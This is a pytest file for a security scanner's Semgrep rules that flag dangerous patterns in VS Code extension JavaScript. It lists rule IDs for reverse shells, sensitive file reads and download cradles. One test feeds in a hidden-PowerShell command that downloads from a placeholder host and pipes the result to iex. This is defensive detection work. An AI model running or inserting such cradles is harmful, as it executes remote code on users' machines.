"""Security-lane fire/silence contract for the Semgrep JS rules (ES-4, ADR 0016).

Hermetic by design: no Semgrep wheel, no container (the security lane asserts
outbound egress is blocked). It verifies the custom rules exist and that the
runner's mapper *fires* on each dangerous pattern Semgrep reports and stays
*silent* otherwise. The real-Semgrep live-fire check lives in the container smoke
test; the wheel is intentionally kept out of this lane. Enrolled in the
``make test-security`` explicit file list.
"""

from __future__ import annotations

import json
import re
import subprocess
from pathlib import Path
from typing import Any

import pytest
import yaml

from static_runtime import semgrep_runner

_EXPECTED_RULE_IDS = {
    "eval",
    "function_constructor",
    "child_process",
    "vm_runincontext",
    "outbound_net_module",
    "dynamic_require",
    "base64_decode_exec",
    "sensitive_file_read",
    "reverse_shell_pipe",
    "reverse_shell_spawn",
    "reverse_shell_ip_connect",
    "download_cradle",
}
_RULES_FILE = (
    Path(semgrep_runner.__file__).resolve().parent
    / "semgrep_rules"
    / "extrace-vsix-js.yml"
)
_VSIX = "/abs/vsix"


def test_rules_file_defines_exactly_the_expected_js_rules() -> None:
    """The shipped rule set is exactly the expected pattern set (the ADR 0016
    §Decision 4 four plus the follow-on network / obfuscation / credential
    rules), each wired into the runner's contract-identity table."""
    doc = yaml.safe_load(_RULES_FILE.read_text(encoding="utf-8"))
    ids = {rule["id"] for rule in doc["rules"]}
    assert ids == _EXPECTED_RULE_IDS
    assert ids <= set(semgrep_runner._RULE_META)


def _run_with(
    monkeypatch: pytest.MonkeyPatch, results: list[dict[str, Any]]
) -> semgrep_runner.SemgrepRunResult:
    def fake_run(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess[str]:
        return subprocess.CompletedProcess(
            args=argv,
            returncode=1 if results else 0,
            stdout=json.dumps({"results": results, "errors": []}),
            stderr="",
        )

    monkeypatch.setattr(semgrep_runner.subprocess, "run", fake_run)
    return semgrep_runner.run_semgrep(vsix_dir=_VSIX, wall_timeout_s=20)


@pytest.mark.parametrize("bare_id", sorted(_EXPECTED_RULE_IDS))
def test_dangerous_pattern_fires(monkeypatch: pytest.MonkeyPatch, bare_id: str) -> None:
    """Each dangerous JS pattern, once Semgrep matches it, becomes a finding."""
    result = {
        "check_id": f"semgrep_rules.extrace-vsix-js.{bare_id}",
        "path": f"{_VSIX}/out/ext.js",
        "start": {"line": 3},
        "extra": {"lines": "dangerous()"},
    }
    res = _run_with(monkeypatch, [result])
    assert [f.rule_id for f in res.findings] == [
        semgrep_runner._RULE_META[bare_id].rule_id
    ]


def test_benign_scan_is_silent(monkeypatch: pytest.MonkeyPatch) -> None:
    """A benign tree (Semgrep matched nothing) yields zero findings, status ok."""
    res = _run_with(monkeypatch, [])
    assert res.findings == []
    assert res.record.status == "ok"


def test_download_cradle_pattern_regex_matches_cradle_not_benign() -> None:
    """Validate the shipped ``download_cradle`` pattern-regex locally.

    It is the one custom rule that matches on a raw regex rather than an AST
    pattern, so the real fire is only exercised in the Semgrep container. Compiling
    the YAML's ``pattern-regex`` (RE2 features used here are also valid Python re)
    pins the pattern's logic — matches the ordered powershell->download->execute
    cradle on one line, stays silent on a bare PowerShell spawn or scattered
    tokens across lines (the GitHub.copilot-chat-style false-positive shape)."""
    doc = yaml.safe_load(_RULES_FILE.read_text(encoding="utf-8"))
    rule = next(r for r in doc["rules"] if r["id"] == "download_cradle")
    pattern = re.compile(rule["patterns"][0]["pattern-regex"])

    # Fires: the hidden-PowerShell irm/Invoke-WebRequest -> iex cradle on one line.
    assert pattern.search(
        'powershell -WindowStyle Hidden -Command "irm https://x.example/aaa | iex"'
    )
    assert pattern.search('pwsh -c "Invoke-WebRequest h | Invoke-Expression"')

    # Silent: a bare powershell spawn (no cradle), and the four token classes
    # scattered across separate lines (the loose-co-occurrence false positive).
    assert not pattern.search('spawn("powershell.exe", ["-File", "./setup.ps1"])')
    assert not pattern.search("powershell\nInvoke-WebRequest(url)\nlet iex = 0")
